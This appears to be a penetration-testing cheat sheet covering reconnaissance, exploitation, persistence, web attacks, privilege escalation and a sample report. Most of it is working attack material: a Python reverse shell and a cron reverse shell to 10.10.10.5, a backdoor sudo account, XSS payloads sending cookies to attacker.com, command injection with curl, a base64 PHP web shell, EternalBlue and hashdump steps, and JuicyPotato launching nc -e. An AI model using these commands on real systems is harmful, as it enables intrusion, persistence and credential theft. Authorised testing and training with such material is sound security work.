🔍 Penetration Testing Methodology​

1. Planning & Reconnaissance​

# Passive information gathering
whois target.com
nslookup target.com
dig target.com any

# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"

# Shodan search
shodan search "hostname:target.com"

# theHarvester - Email/subdomain gathering
theHarvester -d target.com -b google,bing,linkedin

2. Scanning & Enumeration​

# Nmap comprehensive scan
nmap -sC -sV -O -p- -T4 -oA full_scan target.com

# Vulnerability scanning
nmap --script vuln target.com

# Web enumeration
nikto -h http://target.com
whatweb http://target.com

# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com

3. Exploitation​

# Metasploit
msfconsole
search type:exploit platform:linux
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 4444
exploit

# Manual exploitation
nc -lvnp 4444
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

4. Post-Exploitation​

# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg

# Enumerate system
uname -a
cat /etc/issue
cat /etc/passwd
ps aux
netstat -tulpn

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Download LinPEAS
wget http://10.10.10.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

5. Maintaining Access​

# Add SSH key
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:P@ssw0rd" | chpasswd
usermod -aG sudo backdoor

# Persistence with cron
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'") | crontab -

🌐 Web Application Security​

SQL Injection​

-- Authentication bypass
' OR '1'='1' --
admin' --
' OR 1=1 --

-- Union-based SQLi
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,username,password FROM users--

-- Time-based blind SQLi
' AND IF(1=1, SLEEP(5), 0) --
' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --

-- Extracting data
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

Cross-Site Scripting (XSS)​

<!-- Reflected XSS -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Stored XSS -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- DOM-based XSS -->
<script>
var url = new URL(window.location.href);
var search = url.searchParams.get('q');
document.getElementById('search').innerHTML = search;
</script>

<!-- XSS payload examples -->
<script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script>
<iframe src="javascript:alert(1)">

Command Injection​

# Basic injection
; ls
| whoami
& cat /etc/passwd

# Bypass filters
;l\s
;who\ami
;c\at /etc/pass\wd

# Blind command injection
; ping -c 10 attacker.com
; curl http://attacker.com/$(whoami)
; sleep 10

Local File Inclusion (LFI)​

# Basic LFI
?page=../../../etc/passwd
?file=....//....//....//etc/passwd

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=index.php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning
# Inject PHP code into log file, then include it
?page=../../../var/log/apache2/access.log

🔓 Exploitation Tools​

Metasploit Framework​

# Search exploits
msfconsole
search ms17-010
search type:exploit platform:windows smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# Post-exploitation
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > screenshot
meterpreter > shell

Burp Suite​

# Intercept HTTP requests
Proxy > Intercept > Intercept is on

# Repeat requests
Right-click > Send to Repeater

# Brute force login
Right-click > Send to Intruder
Positions > Add §username§ and §password§
Payloads > Load wordlist
Start attack

# Active scanning
Target > Site map > Right-click > Actively scan this branch

SQLMap​

# Detect SQL injection
sqlmap -u "http://target.com/page.php?id=1"

# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

🔼 Privilege Escalation​

Linux Privilege Escalation​

# Check sudo privileges
sudo -l

# Exploit sudo (GTFOBins)
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'

# SUID exploitation
find / -perm -4000 -type f 2>/dev/null
# If find has SUID
find . -exec /bin/sh -p \; -quit

# Check for capabilities
getcap -r / 2>/dev/null
# If python has cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Kernel exploit
uname -a
searchsploit linux kernel 4.15

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
# If writable script in cron
echo "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" >> script.sh

Windows Privilege Escalation​

# Enumerate system
systeminfo
whoami /priv
net user
net localgroup administrators

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"

# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# WinPEAS
.\winPEAS.exe

# Exploit stored credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

# Token impersonation
# If SeImpersonatePrivilege enabled
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe -e cmd.exe 10.10.10.5 4444" -t *

📄 Penetration Testing Report Template​

Executive Summary​

# Penetration Test Report

**Client**: Company Name
**Test Dates**: January 1-7, 2024
**Tester**: Your Name
**Report Date**: January 8, 2024

## Executive Summary

A penetration test was conducted against Company Name's web application and network infrastructure. The assessment identified 12 vulnerabilities:

- **Critical**: 2
- **High**: 4
- **Medium**: 4
- **Low**: 2

The most critical findings include:
1. SQL Injection in login form allowing database access
2. Unauthenticated remote code execution on web server

Immediate action is recommended to address critical and high-severity findings.

Technical Findings​

## Finding 1: SQL Injection in Login Form

**Severity**: Critical
**CVSS Score**: 9.8

**Description**:
The login form at https://target.com/login.php is vulnerable to SQL injection attacks. An attacker can bypass authentication and extract sensitive data from the database.

**Proof of Concept**:
```sql
Username: admin' OR '1'='1' --
Password: anything

Impact:

  • Complete database compromise
  • Unauthorized access to admin panel
  • Exposure of customer data

Remediation:

  1. Use parameterized queries
  2. Implement input validation
  3. Apply principle of least privilege to database user
  4. Enable Web Application Firewall (WAF)

References:

  • OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
